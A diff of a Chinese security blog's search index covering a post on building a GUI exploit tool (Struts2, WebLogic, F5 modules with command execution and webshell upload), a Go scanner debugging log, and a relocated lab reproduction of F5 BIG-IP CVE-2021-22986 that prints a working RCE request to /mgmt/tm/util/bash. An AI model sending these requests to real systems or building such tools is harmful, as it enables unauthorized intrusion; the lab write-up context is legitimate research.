-<p><a href="https://user-images.githubusercontent.com/31311038/129846212-c0a50a7d-0890-4fdf-909e-000981246e3b.mp4">https://user-images.githubusercontent.com/31311038/129846212-c0a50a7d-0890-4fdf-909e-000981246e3b.mp4</a></p>
-<video controls="controls" loop="loop" autoplay="autoplay" width="100%"> 
-    <source src="/img/SJ.mp4" type="video/mp4">
-</video>
-
-<h2 id="0x03-编写属于你的图像化漏洞利用工具"><a href="#0x03-编写属于你的图像化漏洞利用工具" class="headerlink" title="0x03 编写属于你的图像化漏洞利用工具"></a>0x03 编写属于你的图像化漏洞利用工具</h2><h4 id="3-1-项目结构"><a href="#3-1-项目结构" class="headerlink" title="3.1 项目结构"></a>3.1 项目结构</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── ExpDemo-JavaFX.iml</span><br><span class="line">├── logs          运行日志文件</span><br><span class="line">│   ├── debug.log</span><br><span class="line">│   └── error.log</span><br><span class="line">├── pom.xml</span><br><span class="line">└── src</span><br><span class="line">    └── main</span><br><span class="line">        ├── java</span><br><span class="line">        │   └── fun</span><br><span class="line">        │       └── fireline</span><br><span class="line">        │           ├── AppStartUp.java    应用程序启动入口</span><br><span class="line">        │           ├── controller    控制JavaFX图形化界面的各种显示、事件等，核心代码 </span><br><span class="line">        │           │   ├── MainController.java  主界面的controller，负责切换界面和基本信息显示</span><br><span class="line">        │           │   ├── OAController.java   OA漏洞利用切换界面的相关逻辑</span><br><span class="line">        │           │   ├── OthersController.java  其他漏洞界面的相关逻辑</span><br><span class="line">        │           │   ├── Struts2Controller.java  Struts2漏洞利用界面的相关逻辑</span><br><span class="line">        │           │   └── oa      OA漏洞利用的相关逻辑</span><br><span class="line">        │           │       └── OASeeyonController.java</span><br><span class="line">        │           ├── core     核心代码文件夹</span><br><span class="line">        │           │   ├── Constants.java   一些常量基本信息</span><br><span class="line">        │           │   ├── ExploitInterface.java   exp 编写要实现的接口</span><br><span class="line">        │           │   ├── Job.java    一种漏洞全部检查的类</span><br><span class="line">        │           │   └── VulInfo.java</span><br><span class="line">        │           ├── exp			各种 exp 实现类</span><br><span class="line">        │           │   ├── apache</span><br><span class="line">        │           │   │   └── struts2</span><br><span class="line">        │           │   │       ├── S2_005.java</span><br><span class="line">        │           │   │       ├── S2_009.java</span><br><span class="line">        │           │   │       ├── S2_016.java</span><br><span class="line">        │           │   │       ├── S2_019.java</span><br><span class="line">        │           │   │       ├── S2_032.java</span><br><span class="line">        │           │   │       ├── S2_045.java</span><br><span class="line">        │           │   │       ├── S2_046.java</span><br><span class="line">        │           │   │       └── S2_DevMode.java</span><br><span class="line">        │           │   ├── cms</span><br><span class="line">        │           │   │   └── nc</span><br><span class="line">        │           │   │       └── CNVD_2021_30167.java</span><br><span class="line">        │           │   ├── oracle</span><br><span class="line">        │           │   │   └── CVE_2020_14882.java</span><br><span class="line">        │           │   └── others</span><br><span class="line">        │           │       └── CVE_2021_22986.java</span><br><span class="line">        │           └── tools  工具文件夹</span><br><span class="line">        │               ├── HttpTool.java  HTTP 请求封装</span><br><span class="line">        │               ├── MyCERT.java    HTTPS 请求证书设置</span><br><span class="line">        │               └── Tools.java     一些处理函数</span><br><span class="line">        └── resources    资源文件夹</span><br><span class="line">            ├── css      界面css样式表</span><br><span class="line">            │   └── main.css</span><br><span class="line">            ├── fxml    界面的设计文件</span><br><span class="line">            │   ├── Main.fxml</span><br><span class="line">            │   ├── OA.fxml</span><br><span class="line">            │   ├── Others.fxml</span><br><span class="line">            │   ├── Struts2.fxml</span><br><span class="line">            │   ├── Weblogic.fxml</span><br><span class="line">            │   └── oa</span><br><span class="line">            │       ├── OA-E-office.fxml</span><br><span class="line">            │       ├── OA-Kingdee.fxml</span><br><span class="line">            │       ├── OA-Landray.fxml</span><br><span class="line">            │       └── OA-Seeyon.fxml</span><br><span class="line">            ├── img</span><br><span class="line">            │   ├── sec.png</span><br><span class="line">            │   └── weixin.jpg</span><br><span class="line">            └── log4j.properties   日志相关设置</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-2-编写EXP"><a href="#3-2-编写EXP" class="headerlink" title="3.2 编写EXP"></a>3.2 编写EXP</h4><p>编写EXP时，要使用 <code>implements</code>实现<code>ExploitInterface</code>接口，实现接口中的几个方法</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210818133114.png" alt="image-20210327190517731"></p>
-<ul>
-<li>checkVUL		使用poc 检查是否漏洞</li>
-<li>exeCMD          使用exp执行命令</li>
-<li>uploadFile        使用命令执行 写webshell，上传文件</li>
-<li>getWebPath     获取网站的web目录，供上传文件使用</li>
-<li>isVul                是否存在漏洞，检查时会根据结构自动赋值，供后续调用</li>
-</ul>
-<p>EXP具体编写请参考 <code>fun/fireline/exp</code> 下的各种漏洞实现</p>
-<p>当编写完EXP后，转到 <code>fun/fireline/controller</code> 下对应的<strong>xxController.java</strong>文件，比如新编写了Struts2的相关漏洞，修改<strong>Struts2Controller.java</strong>的<strong>STRUTS2</strong>变量，新加入一个漏洞名称，这里对应的是图像化界面中可供选择的漏洞列表</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210818133131.png" alt="image-20210818125816864"></p>
-<p>之后进入和 <code>fun/fireline/tools/Tools.java</code> 的<strong>getExploit</strong>方法中新增一个<strong>else if</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210818133137.png" alt="image-20210818130128550"></p>
-<p>编写完后，可以直接执行<code>fun/fireline/AppStartUp.java</code>类, 查看是否正常运行。</p>
-<p>开发过程中每次修改完运行前，最好将生成的<strong>target</strong>目录删除再运行</p>
-<h4 id="3-3-新增漏洞页面"><a href="#3-3-新增漏洞页面" class="headerlink" title="3.3 新增漏洞页面"></a>3.3 新增漏洞页面</h4><p>具体请看<a href="https://github.com/yhy0/ExpDemo-JavaFX/blob/master/%E6%9B%B4%E6%96%B0%E8%AE%B0%E5%BD%95.md">更新记录.md</a></p>
-<p><a href="https://mp.weixin.qq.com/s/j5BHSbNZ76XbSZp6hFj9fw">ExpDemo-JavaFX工具新增漏洞编写教程</a></p>
-<h4 id="3-4-部署，发布"><a href="#3-4-部署，发布" class="headerlink" title="3.4 部署，发布"></a>3.4 部署，发布</h4><p>当一切编写完成，bug修复完毕，在项目根目录下执行 <strong>mvn package assembly:single</strong> 即可生成 <strong>jar</strong> 文件。</p>
-<p>运行使用<strong>target目录下最大的jar文件</strong> </p>
-<p>对方没有Java环境怎么办？</p>
-<p>使用 <strong>mvn jfx:native</strong> 命令生产对应平台的文件，比如Mac下，执行命令<strong>mvn jfx:native</strong>命令就会在 <strong>target&#x2F;jfx&#x2F;native</strong> 目录下生成打包后应用(win下生成exe)，带可执行文件，带 JRE 运行环境，超大，200+M。</p>
-<p> <strong>mvn clean</strong>用于清除生成的文件。</p>
-<h2 id="0x05-免责声明"><a href="#0x05-免责声明" class="headerlink" title="0x05 免责声明"></a>0x05 免责声明</h2><p>本工具仅能在取得足够合法授权的企业安全建设中使用，在使用本工具过程中，您应确保自己所有行为符合当地的法律法规。</p>
-<p>如您在使用本工具的过程中存在任何非法行为，您将自行承担所有后果，本工具所有开发者和所有贡献者不承担任何法律及连带责任。</p>
-<p>除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。</p>
-<p>您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p>
-<h2 id="开心指数"><a href="#开心指数" class="headerlink" title="开心指数"></a>开心指数</h2><p><a href="https://starchart.cc/yhy0/ExpDemo-JavaFX"><img src="https://starchart.cc/yhy0/ExpDemo-JavaFX.svg" alt="Stargazers over time"></a></p>
-]]></content>
-      <categories>
-        <category>开源工具</category>
-      </categories>
-      <tags>
-        <tag>开源工具</tag>
       </tags>
   </entry>
   <entry>
@@ -1993,6 +1993,60 @@
       </tags>
   </entry>
   <entry>
+    <title>扫描器 debug 调优记录</title>
+    <url>/2023/04/14/%E6%89%AB%E6%8F%8F%E5%99%A8%20debug%20%E8%B0%83%E4%BC%98%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<blockquote>
+<p>  啥时候我能写一个安全行业人手一个工具</p>
+</blockquote>
+<p>go 有个恶心的地方，就是不能捕获子进程的 panic, 每个子进程都使用 <code>recover()</code>去捕获，太麻烦，不现实，而且你也没办法确保你引入的第三方包会捕获子进程; 这就导致我在写扫描器时，某个进程发生 panic , 屏幕输出很长很长的堆栈信息，一屏幕都滚动不完，而且我使用 screen 放到后台，导致我就只能看到非常小的一部分。</p>
+<p>所以只能找其他路子了，下面记录一下使用 dlv 来排查，寻找导致 panic 的地方</p>
+<h2 id="panic-错误"><a href="#panic-错误" class="headerlink" title="panic 错误"></a>panic 错误</h2><p>使用 <a href="https://github.com/go-delve/delve">dlv</a> 调试，前提二进制文件再生成时，不能指定<code>-ldflags &quot;-s -w&quot;</code><br>启动前，先执行</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ulimit</span> -c unlimited</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> GOTRACEBACK=crash</span><br></pre></td></tr></table></figure>
+<p>ulimit命令用于控制shell程序的资源</p>
+<p>-c &lt;core文件上限&gt; 设定core文件的最大值，单位为区块</p>
+<p>unlimited标识不做限制</p>
+<p><code>GOTRACEBACK</code> 来控制Golang panic stack trace输出的信息</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">GOTRACEBACK的设置值有几种，下面分别说明：</span><br><span class="line">export GOTRACEBACK=none ：完全省略<span class="built_in">panic</span>的 stack traces 。</span><br><span class="line">export GOTRACEBACK=single (默认值)只打印当前goroutine的部分stack traces。</span><br><span class="line">    当不存在当前goroutine或者是由于runtime内部的错误导致的<span class="built_in">panic</span>，则会打印出所有goroutine的</span><br><span class="line">    堆栈。</span><br><span class="line">export GOTRACEBACK=all ：打印用户创建的所有goroutine的stack trace。</span><br><span class="line">export GOTRACEBACK=system ：与all的行为很像，只不过会将runtime的goroutine的stace trace也打出来，并且还会显示出runtime内部创建的所有goroutine。</span><br><span class="line">export GOTRACEBACK=crash：与“system”的行为很像，只不过当程序crash的时候不是直接退出，而是可以按照操作系统指定的方式进行后续处理。</span><br><span class="line"></span><br><span class="line">例如，在Unix操作系统中，crash会发送一个SIGABRT信号触发core dump。由于历史原因，当将系统环境变量GOTRACEBACK设置为：<span class="number">0</span>, <span class="number">1</span>, 和 <span class="number">2</span> 的时候，分别代表none, all和system。</span><br><span class="line"></span><br><span class="line">通过包runtime/debug <span class="keyword">package</span>中的方法SetTraceback，也可以设置相应的GOTRACEBACK的值，进而控制输出的stack trace的内容的多少，但是通过该方法，不能够设置比系统环境变量的level更低的值。而level的高低顺序为：none&lt;single&lt;all&lt;system&lt;crash</span><br></pre></td></tr></table></figure>
+
+<p>加上这两句，当程序异常终止时，就是打印堆栈信息，然后会在当前目录下生成一个&#96;core文件</p>
+<ol>
+<li>安装<a href="https://github.com/go-delve/delve">dlv</a></li>
+<li>调试 coredump 文件<br><code>dlv core &#123;这里是你的程序&#125; &#123;这里是coredump文件&#125;  --check-go-version=false</code></li>
+</ol>
+<p>然后使用 <code>goroutines -with running</code>, 查看运行的协程</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202304141956683.png" alt="20230413205255.png"></p>
+<p>看到编号 23794 有个 <code>*</code> 标记<br>切换到对应的协程<code>goroutine 23794</code> ,再试用 <code>bt</code> 子命令分析堆栈的错误</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202304141956246.png" alt="20230413205758.png"></p>
+<p>emmm,我看代码没看出来为啥会发生<code>panic</code><br><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202304141956677.png" alt="20230413211354.png"></p>
+<p>然后求助<strong>ChatGPT</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202304141957223.png" alt="20230413211428.png"></p>
+<p>按照给出的修复方式，然后运行一段时间又出现 <code>panic</code> ,还是这里，emmmmmmm</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202304141957155.png" alt="20230413220608.png"></p>
+<p>我大概知道了,我将 <code>AfrogFingerPrintMap</code> 变量定义到了外部,是一个全局变量， 当多协程使用时，就会发生他说的情况。修复方案就是将变量定义为局部变量，互不干扰。</p>
+<p>教训就是除了一些常量外，尽量不要将变量定义为全局的，不然多协程下修改值必出问题</p>
+<p>还有就是这里重复初始化，可能会导致内存分配出现问题而导致程序崩溃</p>
+<h2 id="oom-killer"><a href="#oom-killer" class="headerlink" title="oom-killer"></a>oom-killer</h2><p>运行一段时间，整个程序被 killed ,小机器不行啊, 又没钱升级，只能找找程序的原因，看看哪里占用了过多的内存，调优性能</p>
+<p>一开始使用保存文件的方式</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">f, _ := os.Create(<span class="string">&quot;mem.prof&quot;</span>) </span><br><span class="line">pprof.WriteHeapProfile(f) </span><br><span class="line"><span class="keyword">defer</span> f.Close()</span><br></pre></td></tr></table></figure>
+<p><code>go tool pprof -http=0.0.0.0:80 SScan-agent mem.prof</code> </p>
+<p>但是看到的信息好像不是很全，之后使用</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;  </span><br><span class="line">http.ListenAndServe(<span class="string">&quot;0.0.0.0:80&quot;</span>, <span class="literal">nil</span>) </span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure>
+
+<p>通过 <code>http://xxx.xxx.xx.xx/debug/pprof/</code> 查看，不好的地方就是要在程序被 killed 前看数据，不过也还好，这个可以监控内存使用率，超过一定阈值通知，然后去看<code>debug/pprof/</code> 相关信息就好了，最终也找到了原因。</p>
+<p>比如 <code>goroutine</code> 居高不下，可能就是哪里发生了死锁，比如 <a href="https://github.com/projectdiscovery/ratelimit">ratelimit</a> 用完不释放</p>
+<p>还有就是 <code>heap</code> 也是居高不下，比如我用到了 <a href="https://github.com/projectdiscovery/httpx">httpx</a>  <code>wappalyzergo</code>、<code>fastdialer</code> 重复初始化，内存没有释放掉，导致了被 killed</p>
+<p>看代码是因为 <code>fastdialer</code> 用完没有调用 <code>close()</code></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/413527587">https://zhuanlan.zhihu.com/p/413527587</a></p>
+<p><a href="https://github.com/go-delve/delve/blob/master/Documentation/cli/README.md#goroutines">https://github.com/go-delve/delve/blob/master/Documentation/cli/README.md#goroutines</a></p>
+]]></content>
+      <categories>
+        <category>开发 - Go</category>
+      </categories>
+      <tags>
+        <tag>开发 - Go</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>漏洞复现-Apache Solr 任意文件读取漏洞</title>
     <url>/2021/03/18/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<blockquote>
@@ -2020,63 +2074,6 @@
 
 <p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210318204258.png" alt="image-20210318204216768"></p>
 <h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247484117&idx=1&sn=2fdab8cbe4b873f8dd8abb35d935d186&chksm=cecfaa8cf9b8239acbc83c363af62c41602cb167c485acc23a9850980044487585e6c408f632&scene=132#wechat_redirect">Apache Solr 任意文件读取漏洞 1Day</a></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>漏洞复现-F5 BIG-IP远程代码执行漏洞(CVE-2021-22986)</title>
-    <url>/2021/04/04/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-F5%20BIG-IP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-22986)/</url>
-    <content><![CDATA[<blockquote>
-<p>  燕子来时新社，梨花落后清明。</p>
-</blockquote>
-<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>F5 BIG-IP 是美国 F5 公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。</p>
-<p>CVE-2021-22986 该漏洞允许未经身份验证的攻击者通过BIG-IP管理界面和自身IP地址对iControl REST接口进行网络访问，以执行任意系统命令，创建或删除文件以及禁用服务。</p>
-<h2 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h2><table>
-<thead>
-<tr>
-<th align="center">F5 BIG-IP 16.0.0-16.0.1</th>
-<th>F5 BIG-IP 12.1.0-12.1.5.2</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">F5 BIG-IP 15.1.0-15.1.2</td>
-<td>F5 BIG-IQ 7.1.0-7.1.0.2</td>
-</tr>
-<tr>
-<td align="center">F5 BIG-IP 14.1.0-14.1.3.1</td>
-<td>F5 BIG-IQ 7.0.0-7.0.0.1</td>
-</tr>
-<tr>
-<td align="center">F5 BIG-IP 13.1.0-13.1.3.5</td>
-<td>F5 BIG-IQ 6.0.0-6.1.0</td>
-</tr>
-</tbody></table>
-<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p><a href="https://login.f5.com/resource/registerEmail.do">https://login.f5.com/resource/registerEmail.do</a> 注册好后，下载</p>
-<p><a href="https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&pro=big-ip_v16.x&ver=16.0.1&container=16.0.1_Virtual-Edition&path=&file=&B1=I+Accept">https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&amp;pro=big-ip_v16.x&amp;ver=16.0.1&amp;container=16.0.1_Virtual-Edition&amp;path=&amp;file=&amp;B1=I+Accept</a>  选择ova格式的，可以快速使用vm虚拟机打开，安装完后，用户名：root，密码：default，成功登陆后，输入config输入config ，几次回车即可看到当前ip，访问</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144019.png" alt="image-20210404113304697"></p>
-<h4 id="3-1-使用POC攻击"><a href="#3-1-使用POC攻击" class="headerlink" title="3.1 使用POC攻击"></a>3.1 使用POC攻击</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mgmt/tm/util/bash HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Authorization: Basic YWRtaW46QVNhc1M=</span><br><span class="line">X-F5-Auth-Token: </span><br><span class="line">Host: 192.168.1.191</span><br><span class="line">Content-Length: 39</span><br><span class="line"></span><br><span class="line">&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c id&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144015.png" alt="image-20210404111524871"></p>
-<h2 id="0x04-利用工具编写"><a href="#0x04-利用工具编写" class="headerlink" title="0x04 利用工具编写"></a>0x04 利用工具编写</h2><p>直接使用上次的<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483987&idx=1&sn=2ee31ccbf8588c23e4184fcd3ab251f8&chksm=c2829b4af5f5125c563e437263eec4ebac08f32f2ace3e4bed9f5c8e562bac5299260b847c27#rd">图形化漏洞利用工具</a>编写</p>
-<blockquote>
-<p>图形化漏洞利用工具已更新</p>
-<p>项目地址：<a href="https://github.com/yhy0/ExpDemo-JavaFX">https://github.com/yhy0/ExpDemo-JavaFX</a></p>
-<p>V1.1 </p>
-<p>​	参考冰蝎的代理，添加代理设置，方便走burp调试</p>
-<p>​	优化批量检查逻辑，使用接口，这样每次添加新的漏洞利用时，就不需要修改批量检查的逻辑。</p>
-</blockquote>
-<p>在<code>src/main/java/com/yhy/core</code>下新建<code>CVE_2021_22986</code>类，实现<code>ExploitInterface</code>接口，并实现里面的函数，具体填充，直接将项目中的示例<code>CVE_2020_14882</code> 的内容复制过去，修改一下内容，填充payload即可</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144011.png" alt="image-20210404113814410"></p>
-<p>写完后，进入<code>src/main/java/com/yhy/core/Constants.java</code> 和 <code>src/main/java/com/yhy/tools/Tools.java</code>修改</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144002.png" alt="image-20210404132413838"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144006.png" alt="image-20210404132702066"></p>
-<p>运行即可。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404143957.gif" alt="CVE-2021-22986"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -2428,6 +2425,63 @@
       <tags>
         <tag>Windows提权</tag>
         <tag>域渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞复现-F5 BIG-IP远程代码执行漏洞(CVE-2021-22986)</title>
+    <url>/2021/04/04/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-F5%20BIG-IP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-22986)/</url>
+    <content><![CDATA[<blockquote>
+<p>  燕子来时新社，梨花落后清明。</p>
+</blockquote>
+<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>F5 BIG-IP 是美国 F5 公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。</p>
+<p>CVE-2021-22986 该漏洞允许未经身份验证的攻击者通过BIG-IP管理界面和自身IP地址对iControl REST接口进行网络访问，以执行任意系统命令，创建或删除文件以及禁用服务。</p>
+<h2 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h2><table>
+<thead>
+<tr>
+<th align="center">F5 BIG-IP 16.0.0-16.0.1</th>
+<th>F5 BIG-IP 12.1.0-12.1.5.2</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">F5 BIG-IP 15.1.0-15.1.2</td>
+<td>F5 BIG-IQ 7.1.0-7.1.0.2</td>
+</tr>
+<tr>
+<td align="center">F5 BIG-IP 14.1.0-14.1.3.1</td>
+<td>F5 BIG-IQ 7.0.0-7.0.0.1</td>
+</tr>
+<tr>
+<td align="center">F5 BIG-IP 13.1.0-13.1.3.5</td>
+<td>F5 BIG-IQ 6.0.0-6.1.0</td>
+</tr>
+</tbody></table>
+<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p><a href="https://login.f5.com/resource/registerEmail.do">https://login.f5.com/resource/registerEmail.do</a> 注册好后，下载</p>
+<p><a href="https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&pro=big-ip_v16.x&ver=16.0.1&container=16.0.1_Virtual-Edition&path=&file=&B1=I+Accept">https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&amp;pro=big-ip_v16.x&amp;ver=16.0.1&amp;container=16.0.1_Virtual-Edition&amp;path=&amp;file=&amp;B1=I+Accept</a>  选择ova格式的，可以快速使用vm虚拟机打开，安装完后，用户名：root，密码：default，成功登陆后，输入config输入config ，几次回车即可看到当前ip，访问</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144019.png" alt="image-20210404113304697"></p>
+<h4 id="3-1-使用POC攻击"><a href="#3-1-使用POC攻击" class="headerlink" title="3.1 使用POC攻击"></a>3.1 使用POC攻击</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mgmt/tm/util/bash HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Authorization: Basic YWRtaW46QVNhc1M=</span><br><span class="line">X-F5-Auth-Token: </span><br><span class="line">Host: 192.168.1.191</span><br><span class="line">Content-Length: 39</span><br><span class="line"></span><br><span class="line">&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c id&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144015.png" alt="image-20210404111524871"></p>
+<h2 id="0x04-利用工具编写"><a href="#0x04-利用工具编写" class="headerlink" title="0x04 利用工具编写"></a>0x04 利用工具编写</h2><p>直接使用上次的<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483987&idx=1&sn=2ee31ccbf8588c23e4184fcd3ab251f8&chksm=c2829b4af5f5125c563e437263eec4ebac08f32f2ace3e4bed9f5c8e562bac5299260b847c27#rd">图形化漏洞利用工具</a>编写</p>
+<blockquote>
+<p>图形化漏洞利用工具已更新</p>
+<p>项目地址：<a href="https://github.com/yhy0/ExpDemo-JavaFX">https://github.com/yhy0/ExpDemo-JavaFX</a></p>
+<p>V1.1 </p>
+<p>​	参考冰蝎的代理，添加代理设置，方便走burp调试</p>
+<p>​	优化批量检查逻辑，使用接口，这样每次添加新的漏洞利用时，就不需要修改批量检查的逻辑。</p>
+</blockquote>
+<p>在<code>src/main/java/com/yhy/core</code>下新建<code>CVE_2021_22986</code>类，实现<code>ExploitInterface</code>接口，并实现里面的函数，具体填充，直接将项目中的示例<code>CVE_2020_14882</code> 的内容复制过去，修改一下内容，填充payload即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144011.png" alt="image-20210404113814410"></p>
+<p>写完后，进入<code>src/main/java/com/yhy/core/Constants.java</code> 和 <code>src/main/java/com/yhy/tools/Tools.java</code>修改</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144002.png" alt="image-20210404132413838"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144006.png" alt="image-20210404132702066"></p>
+<p>运行即可。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404143957.gif" alt="CVE-2021-22986"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
       </tags>
   </entry>
 </search>
